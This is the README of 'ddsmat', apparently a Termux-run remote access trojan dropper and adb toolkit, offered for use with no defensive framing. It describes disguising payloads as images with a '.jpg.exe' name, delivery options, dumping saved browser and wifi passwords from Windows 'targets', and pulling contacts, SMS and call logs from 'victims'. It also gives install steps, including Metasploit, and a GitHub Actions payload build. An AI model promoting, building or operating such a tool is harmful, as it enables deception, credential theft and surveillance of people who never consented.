# ddsmat

Termux-native RAT dropper + adb toolkit. No server. No C2 infra. Runs entirely on your phone.

```
   ___  ___  ___  __  __    _  _____
  |   \|   \/ __|  \/  |   /_\|_   _|
  | |) | |) \__ \ |\/| |  / _ \ | |
  |___/|___/|___/_|  |_| /_/ \_\|_|
```

## what it does

- `/image` — wrap a payload with any image as its icon, drop a `.jpg.exe`
- `/link` — three delivery options from Termux (share sheet / http / upload)
- `/steal` — dump saved browser passwords + wifi from a Windows target
- `/phone` — pull contacts / sms / call log over adb
- `/victims` — list adb-connected targets

## install

```bash
pkg update && pkg install python git android-tools
git clone https://github.com/<you>/ddsmat
cd ddsmat
pip install -r requirements.txt
cp config.example.json config.json
python ddsmat.py
```

For `.exe` payloads:

```bash
pip install pyinstaller
```

For Android payloads:

```bash
pkg install metasploit
```

## commands

```
/image <path> <name> [target]   build a ratted payload (windows | linux | android)
/link  <file>                   delivery options
/victims                        list adb-connected devices
/steal [victim]                 dump saved passwords
/phone <victim> [what]          pull contacts/sms/calls (all | contacts | sms | calls)
/ls                             list builds
/open <name>                    print path to a build
/help                           this
/exit                           quit
```

## remote builds via github actions

trigger the `build-payload` workflow from the Actions tab to build a Windows payload on GitHub's runners. Download the `.exe` from artifacts.

## license

MIT — see [LICENSE](LICENSE).
